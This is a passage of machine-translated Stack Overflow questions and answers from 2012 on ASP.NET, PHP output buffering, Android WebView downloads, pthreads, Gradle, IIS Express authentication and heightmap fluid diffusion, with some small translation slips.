> warning: Warp(s) other than the current warp had to be single-stepped.

...happens because of the execution within cuda-gdb, or if it is something that would happen in normal program execution as well. I do have the program hanging at parts of the code, soon after it freezes for good. But I think that if it was only a matter of serial execution, it would continue soon after, as it does in conventional code.

# asp.net - 使用 GridView 更新带有标识列的更新 SQL 表

> ID：12392171
> 
> 赞同：0
> 
> 时间：2012-09-12T15:59:27.890
> 
> 标签：asp.net, sql, visual-studio-2012

我正在尝试更新具有和 indentity 列的表。因此，当我尝试在 gridview 中更新一行时，我收到以下错误“无法更新标识列'ManufactureID'。]”我知道您可以插入更新的行，然后删除旧行。

```
<asp:GridView ID="GridView1" runat="server" AllowSorting="True" AutoGenerateColumns="False"     DataKeyNames="Name" DataSourceID="SqlDataSource1" EmptyDataText="There are no data records to display.">
        <Columns>
            <asp:CommandField ShowDeleteButton="True" ShowEditButton="True" ShowSelectButton="True" />
            <asp:BoundField DataField="ManufactureID" HeaderText="ManufactureID" ReadOnly="True" SortExpression="ManufactureID" />
            <asp:BoundField DataField="Name" HeaderText="Name" SortExpression="Name" />
            <asp:BoundField DataField="Address" HeaderText="Address" SortExpression="Address" />
            <asp:BoundField DataField="Providence" HeaderText="Providence" SortExpression="Providence" />
            <asp:BoundField DataField="City" HeaderText="City" SortExpression="City" />
            <asp:BoundField DataField="ZipCode" HeaderText="ZipCode" SortExpression="ZipCode" />
            <asp:BoundField DataField="Country" HeaderText="Country" SortExpression="Country" />
            <asp:BoundField DataField="Phone" HeaderText="Phone" SortExpression="Phone" />
            <asp:BoundField DataField="Fax" HeaderText="Fax" SortExpression="Fax" />
            <asp:BoundField DataField="Email" HeaderText="Email" SortExpression="Email" />
        </Columns>
    </asp:GridView>
    <asp:SqlDataSource ID="SqlDataSource1" runat="server" ConnectionString="<%$ ConnectionStrings:GreatGrizzlyConnectionString1 %>" DeleteCommand="DELETE FROM [Manufacturer] WHERE [Name] = @Name" InsertCommand="INSERT INTO [Manufacturer] ([Name], [Address], [Providence], [City], [ZipCode], [Country], [Phone], [Fax], [Email]) VALUES (@Name, @Address, @Providence, @City, @ZipCode, @Country, @Phone, @Fax, @Email)" ProviderName="<%$ ConnectionStrings:SQLTestConnectionString1.ProviderName %>" SelectCommand="SELECT [ManufactureID], [Name], [Address], [Providence], [City], [ZipCode], [Country], [Phone], [Fax], [Email] FROM [Manufacturer]" UpdateCommand="UPDATE [Manufacturer] SET [ManufactureID] = @ManufactureID, [Address] = @Address, [Providence] = @Providence, [City] = @City, [ZipCode] = @ZipCode, [Country] = @Country, [Phone] = @Phone, [Fax] = @Fax, [Email] = @Email WHERE [Name] = @Name">
        <DeleteParameters>
            <asp:Parameter Name="Name" Type="String" />
        </DeleteParameters>
        <InsertParameters>
            <asp:Parameter Name="Name" Type="String" />
            <asp:Parameter Name="Address" Type="String" />
            <asp:Parameter Name="Providence" Type="String" />
            <asp:Parameter Name="City" Type="String" />
            <asp:Parameter Name="ZipCode" Type="String" />
            <asp:Parameter Name="Country" Type="String" />
            <asp:Parameter Name="Phone" Type="String" />
            <asp:Parameter Name="Fax" Type="String" />
            <asp:Parameter Name="Email" Type="String" />
        </InsertParameters>
        <UpdateParameters>
            <asp:Parameter Name="ManufactureID" Type="Int32" />
            <asp:Parameter Name="Address" Type="String" />
            <asp:Parameter Name="Providence" Type="String" />
            <asp:Parameter Name="City" Type="String" />
            <asp:Parameter Name="ZipCode" Type="String" />
            <asp:Parameter Name="Country" Type="String" />
            <asp:Parameter Name="Phone" Type="String" />
            <asp:Parameter Name="Fax" Type="String" />
            <asp:Parameter Name="Email" Type="String" />
            <asp:Parameter Name="Name" Type="String" />
        </UpdateParameters>
    </asp:SqlDataSource> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T19:31:25.753

`UpdateCommand`标签属性中指定的语句`<asp:SqlDataSource>`尝试设置 [ManufactureID]，这就是您收到错误的原因：

`UpdateCommand="UPDATE [Manufacturer] SET [ManufactureID] = @ManufactureID, [Address] = @Address, [Providence] = @Providence, [City] = @City, [ZipCode] = @ZipCode, [Country] = @Country, [Phone] = @Phone, [Fax] = @Fax, [Email] = @Email WHERE [Name] = @Name"`

您需要删除`[ManufactureID] = @ManufactureID,`并`<asp:Parameter Name="ManufactureID" Type="Int32" />`从 under中删除`<UpdateParameters>`，这应该可以解决问题。

# c# - .NET 中 ThreadStart_Context 的奇怪延迟导致性能问题

> ID：12392172
> 
> 赞同：3
> 
> 时间：2012-09-12T15:59:31.513
> 
> 标签：c#, .net, performance, dottrace

我编写了一个访问 ClosedXML 库的相对简单的控制台实用程序，以生成 Excel 电子表格。没有什么令人兴奋的，它应该运行得非常快。但是，当我启动它时，它会在控制台屏幕上停留约 8 秒，然后才会显示任何进度。

起初，我认为这是 ClosedXML 库需要一段时间来初始化。我启动了 dotTrace 并逐行进行性能分析，得到了一些奇怪的结果：

*   主线程 [14,352ms]
    *   主要 [99.29% - 14,251 毫秒]
        *   生成 [88.88% - 12,756ms]
            *   11 个列出的调用总计 23.44% / 4,360ms
        *   get_Instance [6.78% - 974ms]
        *   Console.ReadLine [2.75% - 394ms]
        *   ResolvePolicy [0.82% - 118ms]
        *   11个隐藏函数[0.01% - 1ms]
    *   ResolvePolicy [0.20% - 29ms]
    *   7 个列出的调用加起来为 0.51% / 72ms
*   线程“.NET SystemEvents”[3,074 毫秒]
    *   线程启动 [100% - 3,074 毫秒]
        *   运行 [99.6% - 3,072 毫秒]
            *   ThreadStart_Context [99.93% - 3,072ms]

现在，如果我们深入`ThreadStart_Context`研究 ，我们会看到以下内容：

*   System.Threading.ThreadHelper.ThreadStart_Context(Object) [99.93% - 3,072ms]
    *   Microsoft.Win32.SystemEvents.WindowThreadProc [99.90% - 3,071ms]
        *   Microsoft.Win32.UnsafeNativeMethods.MsgWaitForMultipleObjectsEx [87.26% - 2,682ms]

据分析器称，该`MsgWaitForMultipleObjectsEx`API 总共被调用了 26 次。这意味着它每次等待大约等待 100 毫秒。

该`Generate`方法是我编写的，它与 ClosedXML 库进行了很多对话。部分操作涉及写入磁盘，但在控制台输出应该出现之后，最后完成了。延迟发生在任何工作完成之前。

我的担忧有两个：

1.  `Generate`为什么在主线程调用下结果会有8396ms的时间差异？
2.  为什么有这么多的调用`MsgWaitForMultipleObjectsEx`，总共需要 3 秒？我知道这可能是由于线程同步造成的，但应用程序中只有 1 个线程。

**更新：**好的，所以我发现第二个线程实际上是在处理消息循环，所以在那里花费的 5 秒只是没有任何窗口消息要处理的区域。不过，仍然不确定 8 秒的差异来自哪里。

# php - PHP：输出缓冲区回调不改变输出

> ID：12392173
> 
> 赞同：3
> 
> 时间：2012-09-12T15:59:34.950
> 
> 标签：php, output-buffering

我有一个带有回调函数的输出缓冲区。然而，当清理缓冲区时，回调函数被执行，返回的字符串并没有被改变。

我正在使用以下代码：

```
<?php
ob_start('callback');
print 'some text';
error_log(ob_get_clean());

function callback($content) {
  error_log('callback');
  return $content . ' altered'; 
} 
```

输出：

```
callback
some text 
```

我想要的是：

```
callback
some text altered 
```

我错过了什么？我在 CLI 中使用 PHP 5.3.10。

**编辑：正在执行回调。**

来自 PHP 手册：

> 当输出缓冲区被刷新（发送）或清理（使用 ob_flush()、ob_clean() 或类似函数）或在请求结束时将输出缓冲区刷新到浏览器时，将调用该函数。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-12T16:33:51.123

我不确定这是错误还是功能。看PHP源码发现在`ob_get_clean`调用回调之前填充了的返回值。

我看到至少两种解决方法。第一种是自己手动调用输出字符串的回调。我认为这无需举例。

第二个是利用堆栈输出缓冲的可能性。由于刷新成功使用回调，您可以将输出代码包装在一个额外的输出缓冲区中并获取修改后的内容。

```
ob_start();

function callback($input) { return $input . " altered"; }
ob_start('callback');
echo "foo";
ob_end_flush();

$content = ob_get_clean();
ob_end_clean();
echo $content . "\n"; // prints "foo altered\n" 
```

* * *

`ob_get_clean`如果您好奇，请参阅 (main/output.c) 的源代码。您可以在 PHP 网站上获取源代码。这里有一些指示。

```
/* {{{ proto bool ob_get_clean(void)
   Get current buffer contents and delete current output buffer */
PHP_FUNCTION(ob_get_clean)
{
    if (zend_parse_parameters_none() == FAILURE) {
        return;
    }

    // THIS CALL FILLS THE RETURN VALUE
    if (php_ob_get_buffer(return_value TSRMLS_CC) == FAILURE) {
        RETURN_FALSE;
    }

    if (!OG(ob_nesting_level)) {
        php_error_docref("ref.outcontrol" TSRMLS_CC, E_NOTICE, "failed to delete buffer. No buffer to delete");
        zval_dtor(return_value);
        RETURN_FALSE;
    }
    if (OG(ob_nesting_level) && !OG(active_ob_buffer).status && !OG(active_ob_buffer).erase) {
        php_error_docref("ref.outcontrol" TSRMLS_CC, E_NOTICE, "failed to delete buffer %s", OG(active_ob_buffer).handler_name);
        zval_dtor(return_value);
        RETURN_FALSE;
    }

    // THIS CALL KILLS THE CURRENT BUFFER AND EXECUTES THE CALLBACK
    php_end_ob_buffer(0, 0 TSRMLS_CC);
}
/* }}} */ 
```

`php_end_ob_buffer`获取 OB 缓冲区的内容并对其应用回调。如果第一个参数为真，它将内容传递给下一个输出缓冲处理程序。在这种情况下它是假的，所以即使它执行了回调，内容也会丢失。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:25:26.303

如果我有一个猜测，那就是这个。

`ob_get_clean()`正在返回缓冲区的结果，*然后*清理它，触发修改内容的回调。

IE

从缓冲区中提取“一些文本”并准备根据“获取”功能的要求返回。

接下来，缓冲区被清理，但在清理之前，根据回调存在时对各种 ob 函数的要求，针对内容触发回调。

结果是缓冲区被返回（按请求）但在之后被修改，因为获取发生在清理之前。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-12T16:03:09.050

PHP 的 CLI 不使用输出缓冲（或者更具体地说，缓冲与 ob_ 函数无关）。所以你的回调被跳过了。

编辑：实际上我无法确认 CLI 是否提供标准输出缓冲。我会尝试`ob_end_flush()`,`ob_flush()`和`flush()`.

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-12T16:04:04.760

刷新缓冲区时将调用它：

```
ob_start('callback');
print 'some text';
ob_end_flush();

function callback($content) {
  return $content . ' altered'; 
} 
```

PS它也适用于CLI。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-09-12T16:12:58.183

我删除 ob_get_clean 并且您的代码确实有效。

```
ob_start('callback');
print 'some text';
//error_log(ob_get_clean());

$buffer = ob_get_flush();

function callback($content) {
  return $content . ' altered';
} 
```

我检查了输出，它是一些警告文本。

为什么你使用 ob_get_clean() 方法？它清理缓冲区。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-09-12T16:26:49.210

```
<?php ob_start('callback'); ?>

    Foo Bar Baz

<?php
  ob_end_flush();

  function callback($content) {
    $find = "Baz";
    $replace_with = "Foo";
    return (
      str_replace($find, $replace_with, $content)
    );
  }
?> 
```

# perl - 移除 Win32::GUI 控件周围的边框

> ID：12392185
> 
> 赞同：1
> 
> 时间：2012-09-12T16:00:35.597
> 
> 标签：perl, listview, border, win32gui, perlapp

每当我使用 PerlApp 生成项目的二进制文件时，文本框和列表视图等控件的周围都有一个丑陋的灰色边框。（[示例图片](http://i.stack.imgur.com/RJK8b.png)）

我使用以下代码创建列表视图：

```
my $listview = $main->AddListView(
    -size => [250,250],
    -name => 'listview',
    -pos => [50,50],
    -gridlines => 1,
    -sunken => 0,
    -border => 0,
    -borderstyle => 0,
); 
```

这个问题有解决方案吗？谢谢，

最大限度。

# java - Gradle：如何将任务划分为顺序执行的动作

> ID：12392186
> 
> 赞同：5
> 
> 时间：2012-09-12T16:00:35.057
> 
> 标签：java, build-automation, gradle

是否可以在gradle中嵌套任务，例如

```
task foo(dependsOn: jar){
    // task 1
    // task 2
    // task 3
    .
    .
    .
    // task n
} 
```

执行顺序是`jar`> `foo`> `task 1`> `task 2`> `task 3`> ... > `task n`？我不希望将嵌套任务（即`task 1`、`task 2`等）暴露给用户。我只希望`foo`暴露任务。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-12T17:24:00.153

看起来您可以简单地执行以下操作，

```
task foo(dependsOn: ['clean', 'jar']){
    foo << {
        println "First"
    }
    foo << {
        println "Second"
    }

    foo << {
        println "Third" 
    }
    .
    .
    .
} 
```

`<<`的简写在哪里`doLast`。我认为这种方法的巧妙之处在于它只`foo`被暴露了......嵌套的任务对最终用户仍然是隐藏的。如果你执行`foo`，你会得到

```
First
Second
Third 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-12T17:37:04.933

Gradle 中没有办法只公开选定的任务（严格意义上）。但是，有一种方法可以仅在`gradle tasks`. 除非`--all`使用该标志，`gradle tasks`否则只会显示“根”任务（即没有其他任务依赖的任务）和`group`设置了属性的任务。

# android-intent - 如何直接从 Android WebView 触发文件下载，以便经过身份验证的用户不必再次登录？

> ID：12392188
> 
> 赞同：4
> 
> 时间：2012-09-12T16:00:35.947
> 
> 标签：android-intent, download, android-webview

用户通过 WebView 登录到我的应用程序内的移动页面。我正在使用以下代码从 WebView 请求中捕获可下载资源并将其作为意图传递：

```
webView.setDownloadListener(new DownloadListener() {

            public void onDownloadStart(String url, String userAgent,
                    String contentDisposition, String mimetype,
                    long contentLength) {
              Intent i = new Intent(Intent.ACTION_VIEW);
              i.setData(Uri.parse(url));
              startActivity(i);
            }
        }); 
```

在模拟器中，这实际上打开了 Android 浏览器，**然后要求用户再次登录**，此时它开始下载文件。

有没有办法可以直接从我的 WebView 触发下载，这样用户就不必再次登录？默认情况下，如果不添加此 DownloadListener，则什么也不会发生。

理想情况下，一旦文件被下载，我想触发文件的意图，所以如果用户有一个 PDF 查看器，它会立即切换到它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-12-14T23:53:46.850

我通过实现下载监听器并传递 cookie 来解决这个问题：

```
this.setDownloadListener(new DownloadListener() {

        public void onDownloadStart(String url, String userAgent,
                                    String contentDisposition, String mimetype,
                                    long len) {
            if ( null != url && (url.endsWith(".pdf") || url.endsWith(".pptx"))) {
                Uri source = Uri.parse(url);
                int lastSEP = url.lastIndexOf("//");
                String DL_to_filename = url.substring( lastSEP+1 );
                DownloadManager.Request request = new DownloadManager.Request(source);
                request.setDescription("requested " + url +" downloading");
                request.setTitle(DL_to_filename);
                String cookies = CookieManager.getInstance().getCookie(url);
                request.addRequestHeader("cookie", cookies);
                request.addRequestHeader("User-Agent", userAgent);
                request.allowScanningByMediaScanner();
                request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
                request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, DL_to_filename);
                request.setVisibleInDownloadsUi(true);
                request.setMimeType(mimetype);

                DownloadManager manager = (DownloadManager) getContext().getSystemService(Context.DOWNLOAD_SERVICE);                   

                manager.enqueue(request);
              }
        }
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-05-24T05:19:49.220

[https://stackoverflow.com/users/5680028/jihshin](https://stackoverflow.com/users/5680028/jihshin)的答案非常适合我但是我的 url 没有包含.pdf，即使是 pdf 所以我只是删除了 if 语句，一切都很完美。

```
this.setDownloadListener(new DownloadListener() {

    public void onDownloadStart(String url, String userAgent,
                                String contentDisposition, String mimetype,
                                long len) {

            Uri source = Uri.parse(url);
            int lastSEP = url.lastIndexOf("//");
            String DL_to_filename = url.substring( lastSEP+1 );
            DownloadManager.Request request = new DownloadManager.Request(source);
            request.setDescription("requested " + url +" downloading");
            request.setTitle(DL_to_filename);
            String cookies = CookieManager.getInstance().getCookie(url);
            request.addRequestHeader("cookie", cookies);
            request.addRequestHeader("User-Agent", userAgent);
            request.allowScanningByMediaScanner();
            request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
            request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, DL_to_filename);
            request.setVisibleInDownloadsUi(true);
            request.setMimeType(mimetype);

            DownloadManager manager = (DownloadManager) getContext().getSystemService(Context.DOWNLOAD_SERVICE);                   

            manager.enqueue(request);

    }
}); 
```

# asp.net - 在 MVC3 中调用 MVC4 Web api 控制器

> ID：12392193
> 
> 赞同：0
> 
> 时间：2012-09-12T16:01:03.680
> 
> 标签：asp.net, asp.net-mvc, asp.net-mvc-3, asp.net-web-api

我正在使用 MVC 3 应用程序并使用 Web api 控制器。

我想用参数调用方法。

但是当我尝试调用该方法时，我得到内部服务器错误（500）我的 global.asax 是：

```
routes.MapHttpRoute(
  name: "PostMethod2",
  routeTemplate: "api/mycontroller/{a}/{b}",
); 
```

我应该向 Global.asax 的 application_start 添加任何代码以路由到参数化方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-03T23:22:24.780

您的路线配置似乎不合法，正确的配置如下所示

```
routes.MapHttpRoute(
  name: "PostMethod2",
  routeTemplate: "api/{controller}/{action}/{a}",
); 
```

注意，“{controller}”和“{action}”不能是随机的。MVC 使用它分别映射到您的控制器和操作（方法）。{a} 将映射到您的参数“int a”。MVC 按照惯例使用映射。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T09:22:27.690

```
RouteTable.Routes.MapPageRoute("Profile", "{Link}.{Id}.aspx", "~/Profile.aspx"); 
```

示例很有帮助！Link 和 Id 是参数

# c - pthread 函数的参数可以是另一个函数吗？

> ID：12392196
> 
> 赞同：4
> 
> 时间：2012-09-12T16:01:35.963
> 
> 标签：c, pthreads

我知道如何将一个函数作为另一个函数的参数传递。但我不知道传递给 pthread 的函数的参数是否可以是另一个函数。这甚至可能吗？

这是编译好的示例代码，但不起作用：

```
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>

pthread_t idThread;

void aFunction(){
    while(1){
        fprintf(stderr,"I've been called!\n");
        usleep(1000000);
    }
}

void * threadFunction(void *argFunc){
    // Do here some stuff;
    // ...

    // Now call the function passed as argument
    void (*func)() = argFunc;
}    

int thread_creator(void(*f)()){
    // I want to use as argument for threadFunction the f function
    pthread_create(&idThread, NULL, threadFUnction, (void *)f);
}

int main(){
    thread_creator(aFunction);
    while(1);
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-12T16:02:45.120

如果您愿意稍微改变规则，它可以是一个函数指针。严格来说`void *`，不能保证 a 能够保存函数指针。像这样的东西（未经测试）：

```
void some_fun()
{
    /* ... */
}

void thread_fun(void *arg)
{
    void (*fun)() = arg;
}

pthread_create(...., (void *) some_fun); 
```

### 编辑

在您的示例中，您还需要通过函数指针调用该函数。就像是：

```
void (*func)() = argFunc;
funct(); /* <-- */ 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-12T16:41:15.077

严格来说，这是不可能的。根据标准，指向的指针`void`可能只是转换为指向对象类型的指针或从指向对象类型的指针转​​换。在某些架构上，函数地址大于对象地址。

> **C11, § 6.3.2.3 指针**
> 
> 指向的指针`void`可以转换为指向任何对象类型的指针或从指向任何对象类型的指针转​​换。指向任何对象类型的指针都可以转换为指向 `void`和返回的指针；结果应与原始指针比较。

否则，它是一个常见的扩展。

> **C11, § J.5.7 函数指针转换**
> 
> 指向对象或 to`void`的指针可以转换为指向函数的指针，从而允许将数据作为函数调用 (6.5.4)。

在您的示例中，您不调用`func`.

```
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>

pthread_t idThread;

void aFunction(void)
{
    while (1) {
        fprintf(stderr, "I've been called!\n");
        usleep(1000000);
    }
}

void *threadFunction(void *argFunc)
{
    void (*func)(void) = argFunc;
    func(); /* HERE */
}

int thread_creator(void (*f)(void))
{
    pthread_create(&idThread, NULL, threadFUnction, (void *) f);
}

int main(void)
{
    thread_creator(aFunction);
    while (1);
    return 0;
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-12T16:49:22.843

添加到已经给出的答案：

从概念上讲，函数指针可以像任何其他类型的指针一样被传递，但是 - 正如已经指出的那样 -`void *`不能保证 a 大到足以容纳函数指针，只能容纳数据指针。

回调函数之类的解决方法`pthread_create`是将所需的函数指针包装在用作用户数据的结构中：

```
struct threadArg
{
    void (*callback)(void);
};

// ...
struct threadArg *threadArg = malloc(sizeof(threadArg));
threadArg->callback = myFunction;
pthread_create(&idThread, NULL, threadFunction, (void *) threadArg); 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-12T16:50:33.143

不需要涉及函数指针的可疑强制转换。线程的参数可以是指向可以包含任何内容的结构的指针。

```
#include <pthread.h>

struct arg {
    void (*func)(void);
    int other_stuff;
};

void function(void)
{

}

void *thread_function(void *arg)
{
    struct arg *a1 = arg;

    a1->func();

    return NULL;
}

int main(void)
{
    pthread_t tid;

    struct arg arg = {.func = function};

    pthread_create(&tid, NULL, thread_function, &arg);
    .
    .
    .

} 
```

# android - 从 TimePicker 获取输入 - Android

> ID：12392197
> 
> 赞同：0
> 
> 时间：2012-09-12T16:01:51.860
> 
> 标签：android, mobile

当用户对 TimePicker 进行更改时，我需要保存小时、分钟以及是上午还是下午，以便以后添加 1.5 小时并在 Android 的默认警报系统中创建警报。

我现在无法保存用户输入...

有谁知道我该怎么做或在哪里可以查看一些代码？

谢谢大家。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:09:35.170

如果您使用的是简单的 TimePicker，则可以使用[OnTimeChangedListener监听每个更改](http://developer.android.com/reference/android/widget/TimePicker.OnTimeChangedListener.html)

如果您使用的是 TimePickerDialog，您可以使用[OnTimeSetListener检索用户按下“设置”按钮的时间](http://developer.android.com/reference/android/app/TimePickerDialog.OnTimeSetListener.html)

希望这有助于为您指明正确的方向。

# activex - 如何知道 ActiveX 想要查找哪个文件？

> ID：12392200
> 
> 赞同：0
> 
> 时间：2012-09-12T16:01:57.350
> 
> 标签：activex

我有一个 ActiveX，它似乎在启动时寻找一个文件。问题是该错误没有给我任何关于它无法访问哪个文件的线索。

消息框是：`The system cannot find the file specified`

我怎么知道它想访问哪个文件？我可以使用哪个工具来了解这一点？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:17:28.083

您可以使用Sysinternals/Microsoft 的[Process Monitor](http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx "进程监视器")。

# visual-studio-2010 - IIS Express / VS Config 仅适用于我自己，不适用于其他用户

> ID：12392203
> 
> 赞同：2
> 
> 时间：2012-09-12T16:02:08.613
> 
> 标签：visual-studio-2010, authentication, windows-authentication, iis-express

使用 Visual Studio 2010 和 IIS Express。我正在调试的网站将只接受来自我的域帐户的登录。如果我从以其他人身份登录的其他系统连接到该站点，则在多次拒绝凭据后会出现 401 错误。我不*认为*这是防火墙问题，因为我已经禁用了所有我能找到的。一旦 IIS Express 运行，我可以看到它绑定的端口正在接受请求：

```
 TCP    0.0.0.0:64611          0.0.0.0:0              LISTENING
 TCP    [::]:64611             [::]:0                 LISTENING 
```

从 IISExpress/Config/ApplicationHost.config：

```
<location path="CAF">
    <system.webServer>
        <security>
            <authentication>
                <windowsAuthentication enabled="true" />
                <anonymousAuthentication enabled="false" />
            </authentication>
       </security>
    </system.webServer>
</location> 
```

应用程序的 web.config（相关部分）：

```
<system.web>
  <compilation debug="true" targetFramework="4.0"/>
  <authentication mode="Windows"/>
</system.web> 
```

在 Visual Studio 中，该项目显示“匿名身份验证 = 禁用”和“Windows 身份验证 = 启用”。

我以“管理员”身份启动 Visual Studio（shift，单击，“以管理员身份运行”）否则错误“无法连接到已配置的开发 Web 服务器，无法为站点 CAF 应用程序注册 URL http://*:64611// . 错误描述：访问被拒绝（0x800700005）”发生。以管理员身份启动 VS 解决了该问题，并且该站点正常运行，但它仅对我进行身份验证。

我在这里有点难过，除非我可以作为几个不同的用户连接，否则我无法真正测试一些多用户功能。

# algorithm - 高度图的离散流体“填充”算法

> ID：12392205
> 
> 赞同：5
> 
> 时间：2012-09-12T16:02:24.167
> 
> 标签：algorithm, simulation, fluid-dynamics

我正在寻找一种算法来描述流体在高度图表面上传播时的瞬态行为。我在 t=0 的起始条件是：

*   大小为 [x, y] 的高度值 (H) 的二维矩阵
*   大小为 [x, y] 的流体高度值 (F) 的二维矩阵
*   矩阵（a）中每个点的面积的度量，即每个位置是1 cm^2
*   流体的粘度值 (u)

我想要的是一种算法，可以在 t'=t+1 处计算流体高度矩阵 F 的新值。在任何时候，我都可以通过 v = a * (F(x,y) - H(x, y)) 计算给定点的流体体积。该算法的理想特性是：

*   它不需要考虑每个点的流体柱顶部或底部的“斜率”或“形状”。即它可以将hieghtmap中的每个值视为描述一个具有一定高度的平坦正方形，而将流体高度图的每个值视为具有平顶的矩形水柱
*   如果遇到“排水管”（即高度图中的一个非常低的点），来自地图所有部分的流体在被拉向它时可能会受到影响。

我正在寻找的一个简单示例是：

*   一个 5x5 高度图矩阵，其中所有值为 0
*   一个 5x5 流体高度图矩阵，其中除 [2, 2] 为 10 外，所有值均为 0。
*   每点面积 1 m^2
*   粘度为 u

该算法将描述在多个时间步长上在 5x5 矩阵上散布的流体“柱”。最终，算法将在所有位置稳定在 10/25 的统一高度，但我真的对两者之间发生的事情很感兴趣。

我试图搜索这种算法，但我能找到的只是描述流体内部粒子行为的方程，这对于我的目的来说太细化了。有谁知道我可以参考这个问题的任何好的资源，或者可能满足我需求的现有算法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-12T16:26:15.653

```
O is your starting fluid-column
o are diffusing columns
************************
X  X  X  X  X

X  X  X  X  X

X  X  O  X  X

X  X  X  X  X

X  X  X  X  X  
************************
--Get the Laplacian of the heights of each neighbour and accumulate results
in a separate matrix
--Then apply the second matrix into first one to do synchronous diffusion
--go to Laplacian step again and again

************************
X  X  X  X  X

X  X  o  X  X

X  o  O  o  X

X  X  o  X  X

X  X  X  X  X  
************************

************************
X  X  .  X  X

X  .  o  .  X

.  o  O  o  .

X  .  o  .  X

X  X  .  X  X  
************************
************************
X  X  .  X  X

X  o  o  o  X

.  o  o  o  .

X  o  o  o  X

X  X  .  X  X  
************************

************************
X  X  .  X  X

X  o  o  o  X

.  o  o  o  .

X  o  o  o  X

X  X  .  X  X  
************************

************************
X  .  o  .  X

.  o  o  o  .

o  o  o  o  o

.  o  o  o  .

X  .  o  .  X  
************************
************************
.  .  .  .  .

.  o  o  o  .

.  o  o  o  .

.  o  o  o  .

.  .  .  .  .  
************************
************************
.  .  .  .  .

.  .  .  .  .

.  .  o  .  .

.  .  .  .  .

.  .  .  .  .  
************************
************************
.  .  .  .  .

.  .  .  .  .

.  .  .  .  .

.  .  .  .  .

.  .  .  .  .  
************************
sorry for very low height-resolution 
```

[拉普拉斯算子](http://en.wikipedia.org/wiki/Laplacian)

[拉普拉斯在扩散中的位置](http://en.wikipedia.org/wiki/Laplace_operator#Diffusion)

[扩散在 Navier-Stokes 方程中的位置](http://en.wikipedia.org/wiki/Navier%E2%80%93Stokes_equations)

[离散拉普拉斯算子](http://en.wikipedia.org/wiki/Discrete_Laplace_operator)

简单算法（伪）：

```
get a cell's value in a.
get neighbour cells' values in b(sum of them)
put b/4.0 in c(getting 4 cells' values)
add a to c
build a matrix with this algorithm
apply the matrix onto old one
goto step 1 
```

更难的算法（伪）：

```
apply discrete-Laplacian-operator on all neighbours(finite-differences thing)
put solution in c height-map
subtract or add c to/from starting height-map
goto step 1 
```

[Jos Stam 的流体求解器](http://www.escapemotions.com/experiments/processing/fluid_water/applet/index.html)在扩散部分也有类似的东西。

# php - 如何使用 PHP 从 PDF 文件中访问元数据信息？

> ID：12392207
> 
> 赞同：4
> 
> 时间：2012-09-12T16:02:24.400
> 
> 标签：php, pdf, xmp, metatag

如何使用 PHP 从 PDF 文件中访问元数据 (XMP) 信息？我需要文件的高度和宽度。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:23:13.237

ImageMagick似乎[理解 PDF](https://stackoverflow.com/a/1143994/569101)并[`Imagick::identifyImage()`](http://us2.php.net/manual/en/imagick.identifyimage.php)返回一个包含大量信息的数组。

这个片段：

```
$img = new Imagick('test.pdf');
var_dump($img->identifyImage()); 
```

生成此渲染：

```
array(9) {
  ["imageName"]=>
  string(9) "/test.pdf"
  ["format"]=>
  string(30) "PDF (Portable Document Format)"
  ["geometry"]=>
  array(2) {
    ["width"]=>
    int(596)
    ["height"]=>
    int(843)
  }
  ["resolution"]=>
  array(2) {
    ["x"]=>
    float(72)
    ["y"]=>
    float(72)
  }
  ["units"]=>
  string(9) "Undefined"
  ["type"]=>
  string(14) "TrueColorMatte"
  ["colorSpace"]=>
  string(3) "RGB"
  ["compression"]=>
  string(9) "Undefined"
  ["fileSize"]=>
  string(7) "37.6KBB"
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:12:19.397

您可能想看看 Zend Framework，特别是他们的[Zend_Pdf](http://framework.zend.com/manual/1.12/en/zend.pdf.info.html)组件。

从他们的手册页：

```
$pdf = Zend_Pdf::load($pdfPath);

echo $pdf->properties['Title'] . "\n";
echo $pdf->properties['Author'] . "\n";

$pdf->properties['Title'] = 'New Title.';
$pdf->save($pdfPath); 
```

高温高压

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-12T16:20:22.707

如果您只想要宽度和高度，请使用

```
<?php 

$pdffile = "filename.pdf";
$pdfinfo = shell_exec("pdfinfo ".$pdffile); 

// find height and width
preg_match('/Page size:\s+([0-9]{0,5}\.?[0-9]{0,3}) x ([0-9]{0,5}\.?[0-9]{0,3})/', $pdfinfo,$heightandwidth); 
$width = $heightandwidth[1]; 
$height = $heightandwidth[2]; 

?> 
```

这将为您提供以 pts 为单位的高度和宽度。然后，您可以做一些简单的数学运算以转换​​为您正在寻找的任何单位。

# php - PDO 抛出错误

> ID：12392208
> 
> 赞同：0
> 
